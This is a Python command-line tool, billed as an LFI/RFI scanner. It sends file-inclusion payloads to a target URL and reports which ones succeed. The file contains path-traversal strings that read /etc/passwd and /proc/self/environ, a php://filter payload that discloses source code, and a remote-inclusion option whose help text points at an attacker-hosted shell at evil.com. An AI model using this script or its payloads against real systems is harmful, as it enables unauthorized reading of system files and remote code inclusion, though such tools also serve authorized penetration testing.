#!/usr/bin/env python3
import requests
import argparse
import urllib3
import re
from termcolor import colored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "../../boot.ini",
    "file:///etc/passwd",
    "/proc/self/environ",
]

SIGNS = [
    "root:x:0:0",
    "[boot loader]",
    "<?php",
    "/bin/bash",
]

def scan(url, method, param, test_type, rfi_url, headers):
    print(colored(f"[🕵️] Testing {test_type} on {param}", "cyan"))
    for payload in LFI_PAYLOADS:
        if test_type == "rfi" and rfi_url:
            payload = rfi_url
        if method == "GET":
            target_url = url.replace("§", payload)
            r = requests.get(target_url, headers=headers, verify=False)
        elif method == "POST":
            r = requests.post(url, data={param: payload}, headers=headers, verify=False)
        else:
            continue

        matched = False
        for sign in SIGNS:
            if sign.lower() in r.text.lower():
                print(colored(f"[✅] {test_type.upper()} Successful → Payload: {payload}", "green"))
                matched = True
                break
        if not matched:
            if payload in r.text:
                print(colored(f"[⚠️] Payload reflected (not executed): {payload}", "yellow"))
            else:
                print(f"[❌] No sign with payload: {payload}")

def main():
    parser = argparse.ArgumentParser(description="🐚 LFI/RFI Scanner - Pro file inclusion vulnerability scanner")
    parser.add_argument("url", help="Target URL with § injection marker or static")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--param", help="POST param name if using POST method")
    parser.add_argument("--rfi", help="Remote URL to test for RFI (e.g., http://evil.com/shell.txt)")
    parser.add_argument("--cookie", help="Inject Cookie header")
    parser.add_argument("--referer", help="Inject Referer header")
    args = parser.parse_args()

    headers = {
        "User-Agent": "Mozilla/5.0 (LFI-RFI-Scanner)",
    }
    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.referer:
        headers["Referer"] = args.referer

    if "§" not in args.url and args.method == "GET":
        print(colored("[!] Use § to indicate injection point in URL for GET method.", "red"))
        return

    scan(args.url, args.method, args.param, "lfi", None, headers)

    if args.rfi:
        print(colored(f"\n🌐 Testing RFI using remote payload: {args.rfi}", "blue"))
        scan(args.url, args.method, args.param, "rfi", args.rfi, headers)

if __name__ == "__main__":
    main()
